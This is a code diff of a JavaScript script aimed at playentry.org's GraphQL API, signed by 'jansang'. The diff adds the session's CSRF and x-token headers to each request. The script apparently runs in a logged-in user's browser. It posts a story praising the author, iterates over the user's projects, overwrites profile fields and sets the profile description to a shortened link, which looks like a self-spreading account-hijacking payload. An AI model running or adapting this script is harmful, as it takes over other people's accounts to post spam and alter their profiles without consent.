@@ -1,5 +1,5 @@
 //code made by jansang
-fetch("https://playentry.org/graphql", {"headers": {"content-type": "application/json",},"body": "{\"query\":\"\
+fetch("https://playentry.org/graphql", {"headers": {"content-type": "application/json","csrf-token":csrfToken(), "x-token":xToken},"body": "{\"query\":\"\
     mutation CREATE_ENTRYSTORY(\
         \
     $content: String\
@@ -192,7 +192,7 @@ fetch("https://playentry.org/graphql", {"headers": {"content-type": "application
         }\
     }\
 \",\"variables\":{\"content\":\"잔상님 사랑해요!\"}}","method": "POST",});
-fetch("https://playentry.org/graphql",{headers:{"content-type":"application/json"},body:'{"query":"\
+fetch("https://playentry.org/graphql",{headers:{"content-type":"application/json","csrf-token":csrfToken(), "x-token":xToken},body:'{"query":"\
     query SELECT_USER_PROJECTS(\
         \
     $user: String!\
@@ -268,7 +268,7 @@ fetch("https://playentry.org/graphql",{headers:{"content-type":"application/json
         }\
     }\
 ","variables":{"target":"${e.id}","targetSubject":"project","targetType":"individual"}}`,method:"POST"})})});
-fetch("https://playentry.org/graphql",{headers:{"content-type":"application/json"},body:'{"query":"\
+fetch("https://playentry.org/graphql",{headers:{"content-type":"application/json","csrf-token":csrfToken(), "x-token":xToken},body:'{"query":"\
     mutation UPDATE_USERINFO (\
         $profileImage: String, \
         $coverImage: String, \
@@ -399,7 +399,7 @@ fetch("https://playentry.org/graphql",{headers:{"content-type":"application/json
         }\
     }\
 ","variables":{"user":"618237cd602eab013a55bea2"}}',method:"POST"});
-fetch("https://playentry.org/graphql",{headers:{"content-type":"application/json"},body:'{"query":"\
+/**fetch("https://playentry.org/graphql",{headers:{"content-type":"application/json","csrf-token":csrfToken(), "x-token":xToken},body:'{"query":"\
     mutation UPDATE_USERINFO (\
         $profileImage: String, \
         $coverImage: String, \
@@ -422,4 +422,4 @@ fetch("https://playentry.org/graphql",{headers:{"content-type":"application/json
 \
         }\
     }\
-","variables":{"description":"임티닉네임 만드는 방법 ㄷㄷ http://naver.me/G8mOq0Av"}}',method:"POST"});
+","variables":{"description":"임티닉네임 만드는 방법 ㄷㄷ http://naver.me/G8mOq0Av"}}',method:"POST"});**/
